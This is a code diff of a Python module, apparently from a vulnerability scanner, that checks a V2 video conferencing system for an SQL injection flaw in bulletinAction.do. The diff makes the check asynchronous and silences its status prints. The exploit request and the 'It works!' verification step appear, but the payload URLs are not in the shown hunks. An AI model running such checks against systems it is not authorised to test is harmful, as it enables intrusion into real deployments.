@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
-import time
+import asyncio
 import requests
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
 
 class V2_BulletinAction_Sql_BaseVerify:
     def __init__(self, url):
@@ -20,7 +20,7 @@ class V2_BulletinAction_Sql_BaseVerify:
             'User-Agent': get_useragent()
         }
 
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -35,23 +35,14 @@ class V2_BulletinAction_Sql_BaseVerify:
         try:
             req = requests.session()
             exp_resp = req.get(exp_url, headers = self.headers)
-            time.sleep(2)
+            await asyncio.sleep(2)
             if exp_resp.status_code == 200:
                 check_resp = req.get(check_url, headers = self.headers)
                 if check_resp.status_code == 200 and "It works!" in check_resp.text:
-                    print('存在V2视频会议系统 bulletinAction.do SQL注入漏洞')
+                    # print('存在V2视频会议系统 bulletinAction.do SQL注入漏洞')
                     return True
-                else:
-                    print('不存在V2视频会议系统 bulletinAction.do SQL注入漏洞')
-                    return False
-            else:
-                print('不存在V2视频会议系统 bulletinAction.do SQL注入漏洞')
-                return False
         except Exception as e:
-            print(e)
-            print('不存在V2视频会议系统 bulletinAction.do SQL注入漏洞')
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
